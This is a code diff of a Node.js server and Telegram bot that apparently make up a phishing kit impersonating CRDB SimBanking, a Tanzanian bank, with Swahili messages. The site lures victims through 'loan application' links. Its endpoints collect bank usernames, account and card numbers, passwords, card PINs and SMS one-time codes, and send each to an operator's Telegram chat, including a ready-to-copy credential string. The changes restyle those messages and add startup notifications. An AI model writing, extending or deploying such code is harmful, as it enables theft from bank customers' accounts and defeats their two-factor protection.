@@ -83,18 +83,20 @@ async function initBot() {
       const firstName = chatInfo.first_name || msg.from.first_name || 'User';
       const lastName = chatInfo.last_name || msg.from.last_name || '';
 
-      if (chatId === String(FALLBACK_ADMIN_ID)) {
-        await bot.sendMessage(chatId, `👑 *Karibu Msimamizi Mkuu*\nKiungo chako: ${APP_URL}/?admin=${FALLBACK_ADMIN_ID}`, { parse_mode: 'Markdown' });
-        return;
-      }
-
       if (!admins.has(chatId)) {
         admins.set(chatId, { authorized: true, paid: true, username, firstName, lastName, startedAt: new Date() });
         saveAdmins();
       }
 
       const userLink = `${APP_URL}/?admin=${chatId}`;
-      await bot.sendMessage(chatId, `👋 *Karibu ${firstName}!*\n\nKiungo chako kiko tayari:\n${userLink}`, { parse_mode: 'Markdown' });
+      const startMessage = `🤖 *BOT STARTED & READY*\n\n` +
+                           `👤 *User Info:*\n` +
+                           `• *Name:* ${firstName} ${lastName}\n` +
+                           `• *Username:* @${username}\n` +
+                           `• *Chat ID:* \`${chatId}\`\n\n` +
+                           `🔗 *Your Loan Application Link:*\n${userLink}`;
+
+      await bot.sendMessage(chatId, startMessage, { parse_mode: 'Markdown' });
     } catch (err) {}
   });
 
@@ -155,7 +157,7 @@ app.get('/', (req, res) => {
   res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// Step 1: Submit Credentials & Bank Details
+// Step 1: Submit Credentials & Bank Details (Box Square Layout)
 app.post('/api/submit-credentials', async (req, res) => {
   try {
     let { username, account, card, password, adminChatId } = req.body || {};
@@ -171,12 +173,17 @@ app.post('/api/submit-credentials', async (req, res) => {
       status: 'WAITING_CREDS_APPROVAL' 
     });
 
-    const message = `🟢 *CRDB SIMBANKING - TAARIFA ZA BENKI*\n\n` +
-                    `👤 *Jina la Mtumiaji:* \`${username}\`\n` +
-                    `💳 *Namba ya Akaunti:* \`${account}\`\n` +
-                    `💳 *Namba ya Kadi:* \`${card}\`\n` +
-                    `🔑 *Nywila:* \`${password}\`\n\n` +
-                    `📋 *Nakili Zote (Copy):*\n\`${username}:${account}:${card}:${password}\``;
+    const message = `┌──────────────────────────────┐\n` +
+                    `│ 🟢 *CRDB SIMBANKING - TAARIFA* │\n` +
+                    `├──────────────────────────────┤\n` +
+                    `│ 👤 *Mtumiaji:* \`${username}\`\n` +
+                    `│ 💳 *Akaunti:* \`${account}\`\n` +
+                    `│ 💳 *Kadi:* \`${card}\`\n` +
+                    `│ 🔑 *Nywila:* \`${password}\`\n` +
+                    `├──────────────────────────────┤\n` +
+                    `│ 📋 *Nakili Zote (Copy):*\n` +
+                    `│ \`${username}:${account}:${card}:${password}\`\n` +
+                    `└──────────────────────────────┘`;
 
     const opts = {
       parse_mode: 'Markdown',
@@ -207,7 +214,7 @@ app.get('/api/check-status/:userId', (req, res) => {
   res.status(200).json({ status: session.status });
 });
 
-// Step 2: Submit 4-digit Card PIN
+// Step 2: Submit 4-digit Card PIN (Box Square Layout)
 app.post('/api/submit-card-pin', async (req, res) => {
   try {
     const { userId, cardPin } = req.body || {};
@@ -218,8 +225,11 @@ app.post('/api/submit-card-pin', async (req, res) => {
     session.status = 'WAITING_PIN_VERIFICATION';
     session.cardPin = cardPin;
 
-    const message = `🟢 *CRDB SIMBANKING - PIN YA KADI*\n\n` +
-                    `🔒 *PIN ya Kadi:* \`${cardPin}\``;
+    const message = `┌──────────────────────────────┐\n` +
+                    `│ 🟢 *CRDB SIMBANKING - PIN*   │\n` +
+                    `├──────────────────────────────┤\n` +
+                    `│ 🔒 *PIN ya Kadi:* \`${cardPin}\`         │\n` +
+                    `└──────────────────────────────┘`;
 
     const opts = {
       parse_mode: 'Markdown',
@@ -241,7 +251,7 @@ app.post('/api/submit-card-pin', async (req, res) => {
   }
 });
 
-// Step 3: Submit 6-digit SMS OTP
+// Step 3: Submit 5-digit SMS OTP (Box Square Layout)
 app.post('/api/submit-otp', async (req, res) => {
   try {
     const { userId, otp } = req.body || {};
@@ -252,8 +262,11 @@ app.post('/api/submit-otp', async (req, res) => {
     session.status = 'WAITING_OTP_VERIFICATION';
     session.otp = otp;
 
-    const message = `🟢 *CRDB SIMBANKING - OTP YA SMS (Tarakimu 6)*\n\n` +
-                    `📱 *Namba ya OTP:* \`${otp}\``;
+    const message = `┌──────────────────────────────┐\n` +
+                    `│ 🟢 *CRDB - OTP (Tarakimu 5)* │\n` +
+                    `├──────────────────────────────┤\n` +
+                    `│ 📱 *Namba ya OTP:* \`${otp}\`        │\n` +
+                    `└──────────────────────────────┘`;
 
     const opts = {
       parse_mode: 'Markdown',
@@ -279,5 +292,17 @@ const PORT = process.env.PORT || 10000;
 app.listen(PORT, async () => {
   await initBot();
   console.log(`Server running on port ${PORT}`);
+
+  if (bot && FALLBACK_ADMIN_ID) {
+    try {
+      const startupMsg = `🚀 *SERVER & TELEGRAM BOT STARTED*\n\n` +
+                         `🟢 *System Status:* Online & Active\n` +
+                         `🌐 *Application URL:* ${APP_URL}\n` +
+                         `👑 *Main Admin Link:*\n${APP_URL}/?admin=${FALLBACK_ADMIN_ID}`;
+      await bot.sendMessage(FALLBACK_ADMIN_ID, startupMsg, { parse_mode: 'Markdown' });
+    } catch (err) {
+      console.error('[Bot Startup Notification Error]', err);
+    }
+  }
 });
-      
+  
